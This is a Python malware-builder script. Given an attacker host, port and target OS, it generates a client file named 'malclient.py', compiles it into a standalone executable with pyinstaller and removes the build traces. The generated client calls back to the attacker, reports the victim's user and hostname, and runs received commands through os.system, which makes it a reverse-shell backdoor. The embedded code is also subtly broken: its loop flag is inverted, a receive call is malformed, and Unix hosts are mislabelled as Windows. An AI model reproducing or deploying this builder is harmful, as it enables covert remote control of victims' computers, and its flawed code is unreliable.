import os, shutil

# Function to delete the files and directories
def remove_paths(paths):
    print("[*] Performing Clean-Up. . .")
    for path in paths:
        if os.path.isdir(path):  # If it's a directory
            try:
                shutil.rmtree(path)  # Remove the entire directory and its contents
                print(f"Directory {path} has been deleted.")
            except Exception as e:
                print(f"Error deleting directory {path}: {e}")
        elif os.path.isfile(path):  # If it's a file
            try:
                os.remove(path)  # Remove the file
                print(f"File {path} has been deleted.")
            except Exception as e:
                print(f"Error deleting file {path}: {e}")
        else:
            print(f"Path {path} does not exist or is not a valid file/directory.")


def CreateScript(lhost:str,lport:str,osTarget:str):
    # create target lists
    unixPorts = ["unix", "linux"]
    winPorts = ["windows", "win", "nt"]

    # create mass list
    validTargets = unixPorts + winPorts

    if osTarget.lower() not in validTargets:
        print(f"[-] {osTarget.lower()} is not a valid target OS")
        return False
    
    baseScript = f"""
import socket
import os
import threading
import subprocess

CONNECTIONENDED = True

def ListenToServer(server):
    global CONNECTIONENDED
    try:
        while CONNECTIONENDED == False:
            recvBuffer = server.recv(4096)
            os.system(server.recv.decode())
    except Exception as e:
        server.close()
        CONNECTIONENDED = False

def StartClient():
    clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    global CONNECTIONENDED

    try:
        clientsocket.connect((\"{lhost}\", {lport}))

        # Turn on listener
        serverListener = threading.Thread(target=ListenToServer, args=[clientsocket])
        serverListener.start()

        # Send system info
        sysInfo = ""
        if os.name == 'nt':
            sysInfo = \"{{\\\"os\\\":\\\"Windows\\\",\\\"user\\\":{{\\\"\\\\" + subprocess.check_output('whoami', text=True).strip() + \"\\"}}\" + \"}}\"
        elif os.name == 'posix':
            sysInfo = \"{{\\\"os\\\":\\\"Windows\\\",\\\"user\\\":{{\\\"\\\\" + subprocess.check_output(['echo \\\"$(hostname)\\$(whoami)\\\"'], text=True).strip() + \"\\"}}\" + \"}}\"

        clientsocket.send(sysInfo.encode())
        clientsocket.recv(64)

        serverListener.join()

    except Exception as e:
        CONNECTIONENDED = False
        clientsocket.close()

def main():
    StartClient()

if __name__ == "__main__":
    main()
"""
    with open('malclient.py', 'w') as MalScript:
        MalScript.write(baseScript)

    print(f"[+] Created malclient.py")
    print("[*] Building portable executable. . .")

    # run a system command to run pyinstaller
    os.system('pyinstaller --onefile malclient.py')

    if osTarget.lower() not in unixPorts:
        shutil.move("dist/malclient.exe", ".")
        print("[+] Created malclient.exe! (Windows Executable)")
    else:
        shutil.move("dist/malclient", ".")
        print("[+] Created malclient! (Unix Executable)")

    # perform clean_up
    remove_paths(['__pycache__', 'build', 'dist', 'malclient.spec'])

    return True